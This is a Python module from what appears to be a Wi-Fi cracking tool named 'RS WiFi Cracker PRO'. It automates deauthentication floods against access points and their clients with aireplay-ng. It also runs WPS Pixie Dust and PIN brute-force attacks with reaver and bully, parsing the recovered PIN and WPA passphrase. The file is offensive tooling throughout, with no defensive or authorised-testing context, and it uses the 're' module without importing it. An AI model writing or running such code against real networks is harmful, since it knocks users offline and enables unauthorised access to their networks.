#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO - Attack Module"""
import os
import time
import subprocess
import random
import threading
from typing import Optional, List
from datetime import datetime


class DeauthAttacker:
    """Deauthentication attack module"""
    
    def __init__(self, interface: str, logger, db=None):
        self.interface = interface
        self.logger = logger
        self.db = db
        self.running = False
        self.attack_thread = None
    
    def deauth(self, bssid: str, client: str = None, count: int = 10) -> bool:
        """Send deauth packets"""
        self.logger.info(f"Sending {count} deauth packets to {bssid}...")
        
        cmd = ['aireplay-ng', '-0', str(count), '-a', bssid]
        if client:
            cmd.extend(['-c', client])
        cmd.append(self.interface)
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                self.logger.success(f"Sent {count} deauth packets")
                if self.db:
                    self.db.log_attack("", "DEAUTH", bssid, "SUCCESS", f"{count} packets")
                return True
            else:
                self.logger.error(f"Deauth failed: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            self.logger.error("Deauth timeout")
            return False
        except Exception as e:
            self.logger.error(f"Deauth failed: {e}")
            return False
    
    def deauth_continuous(self, bssid: str, duration: int = 30, interval: int = 2):
        """Continuous deauth attack"""
        self.logger.info(f"Starting continuous deauth on {bssid} for {duration}s...")
        
        self.running = True
        start_time = time.time()
        packet_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            result = subprocess.run([
                'aireplay-ng', '-0', '5', '-a', bssid, self.interface
            ], capture_output=True, text=True)
            
            packet_count += 5
            self.logger.progress(f"Sent {packet_count} packets...")
            time.sleep(interval)
        
        self.logger.success(f"Deauth attack completed. Total packets: {packet_count}")
        if self.db:
            self.db.log_attack("", "DEAUTH_CONT", bssid, "COMPLETED", f"{packet_count} packets")
    
    def deauth_all_clients(self, bssid: str, clients: List[str], count: int = 5):
        """Deauthenticate all clients"""
        self.logger.info(f"Deauthenticating {len(clients)} clients...")
        
        for client in clients:
            self.deauth(bssid, client, count)
            time.sleep(1)
    
    def stop(self):
        """Stop continuous attack"""
        self.running = False


class WPSAttacker:
    """WPS attack module"""
    
    def __init__(self, interface: str, logger, db=None):
        self.interface = interface
        self.logger = logger
        self.db = db
    
    def pixie_dust(self, bssid: str, timeout: int = 300) -> Optional[str]:
        """WPS Pixie Dust attack"""
        self.logger.info(f"Starting Pixie Dust attack on {bssid}...")
        
        try:
            result = subprocess.run([
                'reaver', '-i', self.interface, '-b', bssid,
                '-vv', '-K', '1'
            ], capture_output=True, text=True, timeout=timeout)
            
            # Parse for WPS PIN
            pin_match = re.search(r'WPS PIN:\s*[\'"]?(\d+)[\'"]?', result.stdout)
            if pin_match:
                pin = pin_match.group(1)
                self.logger.success(f"WPS PIN found: {pin}")
                
                # Get password with PIN
                password = self._get_password_with_pin(bssid, pin)
                if password:
                    self.logger.success(f"Password: {password}")
                    if self.db:
                        self.db.update_handshake_cracked(bssid, password)
                    return password
                
                return pin
            
            # Check for failure reasons
            if 'WPS pin not found' in result.stdout.lower():
                self.logger.warning("Pixie Dust attack not vulnerable")
            elif 'locked' in result.stdout.lower():
                self.logger.warning("WPS is locked")
            
        except subprocess.TimeoutExpired:
            self.logger.warning("Pixie Dust timeout")
        except FileNotFoundError:
            self.logger.error("Reaver not found. Install: apt install reaver")
        except Exception as e:
            self.logger.error(f"Pixie Dust attack failed: {e}")
        
        return None
    
    def _get_password_with_pin(self, bssid: str, pin: str) -> Optional[str]:
        """Get password using WPS PIN"""
        try:
            result = subprocess.run([
                'reaver', '-i', self.interface, '-b', bssid,
                '-p', pin, '-vv'
            ], capture_output=True, text=True, timeout=120)
            
            pwd_match = re.search(r'WPA PSK:\s*[\'"]?(.+?)[\'"]?\s*$', result.stdout, re.MULTILINE)
            if pwd_match:
                return pwd_match.group(1).strip()
        except:
            pass
        
        return None
    
    def brute_force_bully(self, bssid: str, timeout: int = 3600) -> Optional[str]:
        """WPS Brute Force using bully"""
        self.logger.info(f"Starting WPS brute force on {bssid}...")
        
        try:
            result = subprocess.run([
                'bully', '-b', bssid, self.interface,
                '-v', '3', '-c'
            ], capture_output=True, text=True, timeout=timeout)
            
            # Parse for PIN
            pin_match = re.search(r'PIN:\s*[\'"]?(\d+)[\'"]?', result.stdout)
            if pin_match:
                pin = pin_match.group(1)
                self.logger.success(f"WPS PIN found: {pin}")
                return pin
            
            # Check for lock
            if 'locked' in result.stdout.lower():
                self.logger.warning("WPS is locked")
            
        except subprocess.TimeoutExpired:
            self.logger.warning("Brute force timeout")
        except FileNotFoundError:
            self.logger.error("Bully not found. Install: apt install bully")
        except Exception as e:
            self.logger.error(f"Bully attack failed: {e}")
        
        return None
    
    def brute_force_reaver(self, bssid: str, timeout: int = 3600) -> Optional[str]:
        """WPS Brute Force using reaver"""
        self.logger.info(f"Starting reaver brute force on {bssid}...")
        
        try:
            result = subprocess.run([
                'reaver', '-i', self.interface, '-b', bssid,
                '-vv', '-S'
            ], capture_output=True, text=True, timeout=timeout)
            
            pin_match = re.search(r'WPS PIN:\s*[\'"]?(\d+)[\'"]?', result.stdout)
            if pin_match:
                return pin_match.group(1)
                
        except Exception as e:
            self.logger.error(f"Reaver brute force failed: {e}")
        
        return None
    
    def check_wps(self, bssid: str) -> dict:
        """Check WPS status"""
        result = {
            'enabled': False,
            'locked': False,
            'version': None
        }
        
        try:
            output = subprocess.run([
                'wash', '-i', self.interface, '-b', bssid
            ], capture_output=True, text=True, timeout=30)
            
            if bssid.lower() in output.stdout.lower():
                result['enabled'] = True
                
            if 'locked' in output.stdout.lower():
                result['locked'] = True
                
        except:
            pass
        
        return result
